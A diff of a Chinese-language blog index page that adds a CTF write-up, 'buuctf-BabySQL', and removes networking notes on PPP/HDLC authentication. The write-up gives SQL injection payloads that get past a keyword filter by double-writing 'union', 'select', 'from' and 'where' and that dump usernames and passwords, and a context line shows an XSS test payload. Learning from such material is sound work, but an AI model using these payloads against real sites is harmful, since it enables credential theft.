@@ -136,7 +136,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -158,6 +158,97 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://yusisunren5927.github.io/2026/09/12/buuctf-BabySQL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="某贪心鬼的后花园">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 某贪心鬼的后花园">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/09/12/buuctf-BabySQL/" class="post-title-link" itemprop="url">buuctf-BabySQL</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-09-12 15:10:36 / 修改时间：15:48:17" itemprop="dateCreated datePublished" datetime="2026-09-12T15:10:36+08:00">2026-09-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>构造url发现这里对个别字符串进行了过滤，可以通过双写的方式进行绕过</p>
+<p><img src="/images/buuctf-BabySQL/QQ_1789197061884.png" alt="img"> </p>
+<p>构造用户名为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; ununionion selselectect 1,2,3#</span><br></pre></td></tr></table></figure>
+
+<p>密码随便输</p>
+<p>看到回显结果为</p>
+<p><img src="/images/buuctf-BabySQL/QQ_1789197490723.png" alt="img"> </p>
+<p>因此2是回显位置，我们将这个位置换成我们要查询的数据库，后续的操作都在这个位置进行</p>
+<p>看到回显结果为</p>
+<p><img src="/images/buuctf-BabySQL/QQ_1789197706022.png" alt="img"> </p>
+<p>-1’ ununionion selselectect 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database(),3#</p>
+<p>发现对where，from，information也进行了过滤</p>
+<p><img src="/images/buuctf-BabySQL/QQ_1789197897900.png" alt="img"> </p>
+<p>将url进行双写绕过，得到数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; ununionion selselectect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/buuctf-BabySQL/QQ_1789198059692.png" alt="img"> </p>
+<p>最后直接爆flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; ununionion selselectect 1,concat(username,0x3a,passwoorrd),3 frfromom b4bsql limit 7,1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/buuctf-BabySQL/QQ_1789198176485.png" alt="img"> </p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1439,152 +1530,6 @@
 <li>后面的<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>是一段新的独立的标签</li>
 <li>最后面的”&gt;是多余垃圾字符，会被浏览器忽略</li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://yusisunren5927.github.io/2026/05/15/ppp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="某贪心鬼的后花园">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 某贪心鬼的后花园">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/05/15/ppp/" class="post-title-link" itemprop="url">ppp</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-05-15 16:39:43 / 修改时间：16:41:04" itemprop="dateCreated datePublished" datetime="2026-05-15T16:39:43+08:00">2026-05-15</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="一、基础概述"><a href="#一、基础概述" class="headerlink" title="一、基础概述"></a>一、基础概述</h2><ol>
-<li><strong>PPP、HDLC</strong> 都是<strong>广域网链路层点到点协议</strong>，用于串行串口链路封装。</li>
-<li>华为设备<strong>串行接口默认封装协议是 PPP</strong>。</li>
-<li>串口为点到点类型，<strong>不需要 MAC 地址、不需要 ARP</strong>。</li>
-<li>链路两端<strong>封装协议必须一致</strong>才能正常通信。</li>
-</ol>
-<h2 id="二、HDLC-协议"><a href="#二、HDLC-协议" class="headerlink" title="二、HDLC 协议"></a>二、HDLC 协议</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>HDLC：高级数据链路控制，<strong>面向比特</strong>的链路层协议。</p>
-<h3 id="2-对比-PPP"><a href="#2-对比-PPP" class="headerlink" title="2. 对比 PPP"></a>2. 对比 PPP</h3><table>
-<thead>
-<tr>
-<th>特性</th>
-<th>HDLC</th>
-<th>PPP</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>认证功能</td>
-<td>不支持</td>
-<td>支持 PAP&#x2F;CHAP 认证</td>
-</tr>
-<tr>
-<td>差错检测</td>
-<td>无</td>
-<td>有</td>
-</tr>
-<tr>
-<td>差错恢复</td>
-<td>无</td>
-<td>有</td>
-</tr>
-<tr>
-<td>同步&#x2F;异步链路</td>
-<td>仅同步</td>
-<td>同步、异步都支持</td>
-</tr>
-</tbody></table>
-<h3 id="3-HDLC-基础配置"><a href="#3-HDLC-基础配置" class="headerlink" title="3. HDLC 基础配置"></a>3. HDLC 基础配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface Serial 1/0/0</span><br><span class="line">link-protocol hdlc</span><br><span class="line">ip address 10.0.1.1 255.255.255.252</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-接口-IP-地址借用（节省公网-网段地址）"><a href="#4-接口-IP-地址借用（节省公网-网段地址）" class="headerlink" title="4. 接口 IP 地址借用（节省公网&#x2F;网段地址）"></a>4. 接口 IP 地址借用（节省公网&#x2F;网段地址）</h3><ul>
-<li>串口可以<strong>借用 LoopBack 回环接口 IP</strong>，不用单独配直连IP</li>
-<li>配置命令：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip address unnumbered interface LoopBack 0</span><br></pre></td></tr></table></figure>
-<ul>
-<li>注意：<br>借用地址后<strong>不能用下一跳IP写静态路由</strong>，必须用<strong>出接口</strong>方式配置静态路由，否则无法ping通。</li>
-</ul>
-<h2 id="三、PPP-协议整体架构"><a href="#三、PPP-协议整体架构" class="headerlink" title="三、PPP 协议整体架构"></a>三、PPP 协议整体架构</h2><p>PPP 由两部分核心组件组成：</p>
-<ol>
-<li><strong>LCP 链路控制协议</strong><ul>
-<li>负责<strong>建立、维护、拆除 PPP 链路</strong></li>
-<li><strong>PAP&#x2F;CHAP 认证在 LCP 阶段完成</strong></li>
-</ul>
-</li>
-<li><strong>NCP 网络层控制协议</strong><ul>
-<li>为不同网络层协议协商参数</li>
-<li>常用 <strong>IPCP</strong> 用于协商 IPv4 参数</li>
-<li>串口没配IP时，<strong>IPCP 状态为 Closed</strong></li>
-</ul>
-</li>
-</ol>
-<h2 id="四、PPP-两种认证方式-PAP-CHAP"><a href="#四、PPP-两种认证方式-PAP-CHAP" class="headerlink" title="四、PPP 两种认证方式 PAP &#x2F; CHAP"></a>四、PPP 两种认证方式 PAP &#x2F; CHAP</h2><h3 id="1-PAP-密码认证协议"><a href="#1-PAP-密码认证协议" class="headerlink" title="1. PAP 密码认证协议"></a>1. PAP 密码认证协议</h3><ul>
-<li><strong>明文传输用户名和密码</strong>，安全性低，易被抓包暴力破解</li>
-<li><strong>二次握手</strong>：被认证方主动发账号密码 → 认证方返回同意&#x2F;拒绝</li>
-<li>仅链路建立阶段认证一次，后续不再校验</li>
-</ul>
-<h3 id="2-CHAP-挑战握手认证协议"><a href="#2-CHAP-挑战握手认证协议" class="headerlink" title="2. CHAP 挑战握手认证协议"></a>2. CHAP 挑战握手认证协议</h3><ul>
-<li><strong>不传输明文密码</strong>，用 <strong>MD5 哈希加密</strong></li>
-<li><strong>三次握手</strong>：认证方先发随机挑战报文 → 被认证方加密响应 → 认证方比对结果</li>
-<li>防暴力破解，链路建立后<strong>还会定期重认证</strong></li>
-<li>企业远程接入、VPN 场景常用</li>
-</ul>
-<h2 id="五、PPP-认证配置命令"><a href="#五、PPP-认证配置命令" class="headerlink" title="五、PPP 认证配置命令"></a>五、PPP 认证配置命令</h2><h3 id="1-AAA-创建用户"><a href="#1-AAA-创建用户" class="headerlink" title="1. AAA 创建用户"></a>1. AAA 创建用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaa</span><br><span class="line">local-user 用户名 password cipher 密码</span><br><span class="line">local-user 用户名 service-type ppp</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-接口开启认证模式"><a href="#2-接口开启认证模式" class="headerlink" title="2. 接口开启认证模式"></a>2. 接口开启认证模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 接口下</span><br><span class="line">ppp authentication-mode pap</span><br><span class="line"># 或</span><br><span class="line">ppp authentication-mode chap</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-被认证方配置"><a href="#3-被认证方配置" class="headerlink" title="3. 被认证方配置"></a>3. 被认证方配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># PAP</span><br><span class="line">ppp pap local-user 用户名 password cipher 密码</span><br><span class="line"></span><br><span class="line"># CHAP</span><br><span class="line">ppp chap user 用户名</span><br><span class="line">ppp chap password cipher 密码</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
